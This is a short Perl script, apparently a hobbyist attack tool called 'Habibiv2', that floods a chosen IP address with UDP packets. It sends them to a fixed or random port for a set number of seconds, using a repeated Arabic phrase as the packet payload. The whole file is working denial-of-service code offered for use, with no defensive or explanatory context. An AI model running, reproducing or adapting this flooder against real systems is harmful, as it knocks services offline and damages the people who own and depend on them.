# -----------
#  Made By D3fe4ted
#   Habibiv2 - Improved payload
# -----------

use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "\n   Usage: perl habibiv2.pl <IP> <PORT> <PACKETSIZE> <SECONDS>\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Invalid IP : $ip\n";
$endtime = time() + ($time ? $time : 9999999);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Stop Attack with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","بارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائمابارك الله فيك دائما"), 
0, pack_sockaddr_in($pport, $iaddr));}